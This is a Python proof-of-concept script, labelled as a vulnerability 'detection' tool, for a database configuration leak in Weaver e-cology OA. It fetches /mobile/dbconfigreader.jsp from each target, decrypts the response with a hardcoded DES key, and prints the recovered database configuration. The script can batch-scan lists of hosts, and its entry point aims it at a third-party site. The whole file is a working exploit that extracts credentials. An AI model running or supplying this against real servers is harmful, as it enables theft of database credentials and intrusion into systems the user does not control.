# -*- coding:utf-8 -*-
import pyDes,requests
import sys
def desdecode(secret_key,s):
    cipherX = pyDes.des('        ')
    cipherX.setKey(secret_key)
    y = cipherX.decrypt(s)
    return y
default_headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
}
def send(url):
    data = requests.get(url='%s/mobile/dbconfigreader.jsp'%url,allow_redirects=False).content
    return (desdecode('1z2x3c4v5b6n', data.strip()))

def setDefaultPro(protocol="http",url=""):
    res         = ''
    if "http" not in url :
        res     =   str(protocol) + "://" + url
    else:
        res     = url 
    return res
#开始进行数据库泄露检测
def run(url,protocol="http"):
    #url = sys.argv[1]
    res  = url
    print('泛微e-cology OA 数据库配置信息泄漏漏洞检测')
    if type(res) == type([]):
        for host in res:
            host     =  setDefaultPro(protocol=protocol,url=host)
            print('[+] url--->%s'%host)
            try:
                print('[+] 数据库信息如下----->:%s'%send(host))
            except Exception as e:
                print('[-] {url} 不存在泛微e-cology OA 数据库配置信息泄漏漏洞'.format(url=host))  

    else:
        host     = res
        host     =  setDefaultPro(protocol=protocol,url=res)
        print('[+] url--->%s'%host)
        try:
            print('[+] 数据库信息如下----->:%s'%send(host))
        except Exception as e:
            print('[-] {url} 不存在泛微e-cology OA 数据库配置信息泄漏漏洞'.format(url=host)) 

if __name__ == '__main__':
    run("https://www.baidu.com")